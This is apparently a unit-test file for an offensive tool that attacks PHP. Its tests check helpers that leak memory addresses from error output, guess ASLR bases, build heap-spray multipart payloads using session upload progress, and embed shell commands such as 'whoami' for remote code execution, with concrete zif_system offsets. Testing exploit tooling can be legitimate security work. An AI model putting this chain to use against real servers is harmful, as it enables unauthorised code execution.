"""Chain D helper function tests.

Covers the three alternative leak/exploit strategies added for Chain D:
  1. _parse_error_leak — extracting addresses from OOM error output
  2. _generate_aslr_candidates — producing aligned candidate base addresses
  3. _build_blind_b2_body — constructing multi-position spray payloads
  4. _send_b2_and_check — sending B2 and checking for RCE
  5. _load_chain_d_profiles — loading offset profiles from JSON
"""

from __future__ import annotations

import json
import os
import tempfile
import unittest
from unittest import mock

from p2s.cli import (
    _parse_error_leak,
    _generate_aslr_candidates,
    _build_blind_b2_body,
    _load_chain_d_profiles,
    _build_chain_d_payload,
)


# ---------------------------------------------------------------------------
# _parse_error_leak
# ---------------------------------------------------------------------------

class ParseErrorLeakTests(unittest.TestCase):
    def test_extracts_hex_pointer_from_oom_message(self) -> None:
        body = (
            "Fatal error: Allowed memory size of 134217728 bytes exhausted "
            "(tried to allocate 20480 bytes) in Unknown on line 0\n"
            "Stack trace at 0x7f4a3c200000:\n"
            "  #0 0x7f4a3c245678 zend_mm_alloc_heap()\n"
            "  #1 0x7f4a3c2abcde _emalloc()\n"
        )
        result = _parse_error_leak(body)
        self.assertIsNotNone(result)
        self.assertEqual(result["arch_hint"], "x86_64")
        self.assertGreaterEqual(result["pointer_count"], 3)
        # The most common 2MiB-aligned base should be 0x7f4a3c200000
        self.assertEqual(result["libphp_base"], 0x7f4a3c200000)
        self.assertIsNone(result["main_chunk_base"])
        self.assertEqual(result["source"], "error_output")

    def test_returns_none_for_no_pointers(self) -> None:
        body = "Fatal error: Allowed memory size of 134217728 bytes exhausted"
        result = _parse_error_leak(body)
        self.assertIsNone(result)

    def test_returns_none_for_empty_body(self) -> None:
        self.assertIsNone(_parse_error_leak(""))

    def test_detects_aarch64_pointers(self) -> None:
        body = "Crash at 0x0000aaab12400000 pc=0x0000aaab12456789"
        result = _parse_error_leak(body)
        self.assertIsNotNone(result)
        self.assertEqual(result["arch_hint"], "aarch64")

    def test_ignores_small_hex_values(self) -> None:
        body = "Error code 0x00000042 at line 0x00000100"
        result = _parse_error_leak(body)
        self.assertIsNone(result)

    def test_multiple_bases_picks_most_common(self) -> None:
        body = (
            "ptr1=0x7f4a3c200100 ptr2=0x7f4a3c200200 "
            "ptr3=0x7f4a3c200300 ptr4=0x7f4a3c400100"
        )
        result = _parse_error_leak(body)
        self.assertIsNotNone(result)
        # Three pointers share base 0x7f4a3c200000, one at 0x7f4a3c400000
        self.assertEqual(result["libphp_base"], 0x7f4a3c200000)
        self.assertEqual(result["unique_bases"], 2)


# ---------------------------------------------------------------------------
# _generate_aslr_candidates
# ---------------------------------------------------------------------------

class GenerateAslrCandidatesTests(unittest.TestCase):
    def test_returns_requested_count_or_fewer(self) -> None:
        candidates = _generate_aslr_candidates(max_candidates=32)
        self.assertLessEqual(len(candidates), 32)
        self.assertGreater(len(candidates), 0)

    def test_all_are_2mib_aligned(self) -> None:
        for addr in _generate_aslr_candidates(max_candidates=64):
            self.assertEqual(addr & 0x1FFFFF, 0, f"0x{addr:x} not 2MiB aligned")

    def test_x86_64_range(self) -> None:
        for addr in _generate_aslr_candidates(arch="x86_64", max_candidates=64):
            self.assertGreaterEqual(addr, 0x7f0000000000)
            self.assertLess(addr, 0x7f8000000000)

    def test_aarch64_range(self) -> None:
        for addr in _generate_aslr_candidates(arch="aarch64", max_candidates=64):
            self.assertGreaterEqual(addr, 0x0000aaaa00000000)
            self.assertLess(addr, 0x0000aaac00000000)

    def test_no_duplicates(self) -> None:
        candidates = _generate_aslr_candidates(max_candidates=128)
        self.assertEqual(len(candidates), len(set(candidates)))

    def test_center_first(self) -> None:
        candidates = _generate_aslr_candidates(arch="x86_64", max_candidates=10)
        center = (0x7f0000000000 + 0x7f8000000000) // 2
        center = center & ~0x1FFFFF
        # First candidate should be the center
        self.assertEqual(candidates[0], center)


# ---------------------------------------------------------------------------
# _build_blind_b2_body
# ---------------------------------------------------------------------------

class BuildBlindB2BodyTests(unittest.TestCase):
    OFFSETS = {
        "zval_ptr_dtor": 0x65EB60,
        "zif_system": 0x465370,
        "fake_array_S": 0xF8398,
        "hsv": 0x7D720,
    }
    SPRAY = {"parts": 10, "depth": 4, "pad_blocks": 2, "pad_size": 100}

    def test_returns_bytes_and_boundary(self) -> None:
        body, boundary = _build_blind_b2_body(
            "id", self.OFFSETS, 0x7f4a3c200000, self.SPRAY,
        )
        self.assertIsInstance(body, bytes)
        self.assertIsInstance(boundary, str)
        self.assertIn(boundary.encode(), body)

    def test_multipart_structure(self) -> None:
        body, boundary = _build_blind_b2_body(
            "id", self.OFFSETS, 0x7f4a3c200000, self.SPRAY,
        )
        text = body.decode("latin-1")
        self.assertTrue(text.startswith(f"--{boundary}\r\n"))
        self.assertTrue(text.endswith(f"--{boundary}--\r\n"))

    def test_multiple_chunk_candidates_produce_multiple_parts(self) -> None:
        chunks = [0x7f4a3c000000, 0x7f4a3be00000, 0x7f4a3c400000]
        body, boundary = _build_blind_b2_body(
            "id", self.OFFSETS, 0x7f4a3c200000, self.SPRAY,
            main_chunk_candidates=chunks,
        )
        text = body.decode("latin-1")
        for i in range(3):
            self.assertIn(f"PHP_SESSION_UPLOAD_PROGRESS_{i:04d}", text)

    def test_single_candidate_uses_single_part(self) -> None:
        body, boundary = _build_blind_b2_body(
            "id", self.OFFSETS, 0x7f4a3c200000, self.SPRAY,
            main_chunk_candidates=[0x7f4a3c000000],
        )
        text = body.decode("latin-1")
        self.assertIn("PHP_SESSION_UPLOAD_PROGRESS_0000", text)
        self.assertNotIn("PHP_SESSION_UPLOAD_PROGRESS_0001", text)

    def test_no_candidates_uses_default(self) -> None:
        body, boundary = _build_blind_b2_body(
            "id", self.OFFSETS, 0x7f4a3c200000, self.SPRAY,
        )
        text = body.decode("latin-1")
        self.assertIn("PHP_SESSION_UPLOAD_PROGRESS", text)
        self.assertNotIn("PHP_SESSION_UPLOAD_PROGRESS_0000", text)

    def test_padding_blocks_present(self) -> None:
        body, _ = _build_blind_b2_body(
            "id", self.OFFSETS, 0x7f4a3c200000, self.SPRAY,
        )
        text = body.decode("latin-1")
        self.assertIn("pad0000", text)
        self.assertIn("pad0001", text)

    def test_listener_callback_in_command(self) -> None:
        listener = mock.MagicMock()
        listener.callback_url.return_value = "http://10.0.0.1:8888/cb/NONCE"
        body, _ = _build_blind_b2_body(
            "id", self.OFFSETS, 0x7f4a3c200000, self.SPRAY,
            listener=listener, canary_nonce="NONCE",
        )
        listener.callback_url.assert_called_once_with("NONCE")


# ---------------------------------------------------------------------------
# _load_chain_d_profiles
# ---------------------------------------------------------------------------

class LoadChainDProfilesTests(unittest.TestCase):
    def test_loads_bundled_profiles(self) -> None:
        profiles = _load_chain_d_profiles()
        self.assertGreater(len(profiles), 0)
        for key, offsets in profiles.items():
            self.assertIn("zval_ptr_dtor", offsets)
            self.assertIn("zif_system", offsets)
            self.assertIsInstance(offsets["zval_ptr_dtor"], int)

    def test_custom_path(self) -> None:
        data = {
            "profiles": {
                "test-profile": {
                    "zval_ptr_dtor": "0x100",
                    "zif_system": "0x200",
                    "fake_array_S": "0x300",
                    "hsv": "0x400",
                }
            }
        }
        fd, path = tempfile.mkstemp(suffix=".json")
        try:
            with os.fdopen(fd, "w") as f:
                json.dump(data, f)
            profiles = _load_chain_d_profiles(path)
            self.assertIn("test-profile", profiles)
            self.assertEqual(profiles["test-profile"]["zval_ptr_dtor"], 0x100)
        finally:
            os.unlink(path)

    def test_missing_custom_path_returns_empty(self) -> None:
        profiles = _load_chain_d_profiles("/nonexistent/path.json")
        self.assertEqual(profiles, {})


# ---------------------------------------------------------------------------
# _build_chain_d_payload
# ---------------------------------------------------------------------------

class BuildChainDPayloadTests(unittest.TestCase):
    OFFSETS = {
        "zval_ptr_dtor": 0x65EB60,
        "zif_system": 0x465370,
        "fake_array_S": 0xF8398,
        "hsv": 0x7D720,
    }

    def test_payload_is_bytes(self) -> None:
        payload = _build_chain_d_payload(
            "id", self.OFFSETS, 0x7f4a3c200000, 0x7f4a3c000000,
        )
        self.assertIsInstance(payload, bytes)
        self.assertGreater(len(payload), 0)

    def test_payload_contains_command(self) -> None:
        payload = _build_chain_d_payload(
            "whoami", self.OFFSETS, 0x7f4a3c200000, 0x7f4a3c000000,
        )
        self.assertIn(b"whoami", payload)


if __name__ == "__main__":
    unittest.main()
